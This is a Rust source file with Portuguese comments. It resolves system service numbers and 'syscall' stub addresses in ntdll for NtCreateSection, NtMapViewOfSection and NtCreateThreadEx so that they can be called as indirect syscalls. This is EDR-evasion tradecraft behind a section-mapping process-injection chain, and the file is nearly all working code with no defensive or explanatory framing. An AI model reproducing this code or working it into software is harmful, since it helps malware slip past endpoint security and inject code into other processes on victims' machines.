use std::ffi::CString;
use std::ptr::null_mut;
use winapi::shared::minwindef::HMODULE;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};

// Importa as globais que vão armazenar SSNs e stubs
use crate::indirect_syscalls::globals::{
    g_NtCreateSectionSSN, g_NtCreateSectionSyscall,
    g_NtCreateThreadExSSN, g_NtCreateThreadExSyscall,
    g_NtMapViewOfSectionSSN, g_NtMapViewOfSectionSyscall,
};

#[derive(Debug, Clone)]
pub struct IndirectSyscall {
    pub ssn: u32,
    pub stub_address: *const u8,
}

/// Extrai o SSN e endereço da instrução `syscall` a partir de uma função exportada do ntdll
pub fn resolve_indirect_syscalls(ntdll: HMODULE, name: &str) -> Option<IndirectSyscall> {
    unsafe {
        if ntdll.is_null() {
            return None;
        }

        let name_cstr = CString::new(name).ok()?;
        let function_ptr = GetProcAddress(ntdll, name_cstr.as_ptr());
        if function_ptr.is_null() {
            return None;
        }

        let byte_ptr = function_ptr as *const u8;
        let func_bytes = std::slice::from_raw_parts(byte_ptr, 20);

        let ssn = if func_bytes[0] == 0xB8 {
            u32::from_le_bytes([func_bytes[1], func_bytes[2], func_bytes[3], func_bytes[4]])
        } else if func_bytes[0] == 0x4C
            && func_bytes[1] == 0x8B
            && func_bytes[2] == 0xD1
            && func_bytes[3] == 0xB8
        {
            u32::from_le_bytes([func_bytes[4], func_bytes[5], func_bytes[6], func_bytes[7]])
        } else {
            println!(
                "[!] {} não bateu com padrões conhecidos. Bytes: {:02X?}",
                name,
                &func_bytes[..10]
            );
            return None;
        };

        let syscall_stub = byte_ptr.add(0x12);
        if *(syscall_stub) == 0x0F && *(syscall_stub.add(1)) == 0x05 {
            Some(IndirectSyscall {
                ssn,
                stub_address: syscall_stub,
            })
        } else {
            println!("[!] Stub não contém syscall (0f 05).");
            None
        }
    }
}

/// Inicializa as globais com os valores resolvidos dos SSNs e endereços de syscall
pub unsafe fn init_indirect_syscalls() {
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
    if ntdll.is_null() {
        eprintln!("[-] GetModuleHandleA(ntdll.dll) retornou NULL");
        std::process::exit(1);
    }

    let mut functions: [(&str, *mut u32, *mut *const u8); 3] = [
        ("NtCreateSection", &mut g_NtCreateSectionSSN, &mut g_NtCreateSectionSyscall),
        ("NtMapViewOfSection", &mut g_NtMapViewOfSectionSSN, &mut g_NtMapViewOfSectionSyscall),
        ("NtCreateThreadEx", &mut g_NtCreateThreadExSSN, &mut g_NtCreateThreadExSyscall),
    ];

    for (name, ssn_ptr, stub_ptr) in functions.iter_mut() {
        if let Some(resolved) = resolve_indirect_syscalls(ntdll, name) {
            // Atribuições seguras dentro de bloco unsafe
            **ssn_ptr = resolved.ssn;
            **stub_ptr = resolved.stub_address;

            println!(
                "[+] Resolved {}: SSN = {:#X}, Stub = {:?}",
                name, resolved.ssn, resolved.stub_address
            );
        } else {
            eprintln!("[-] Failed to resolve {}", name);
            std::process::exit(1);
        }
    }
}
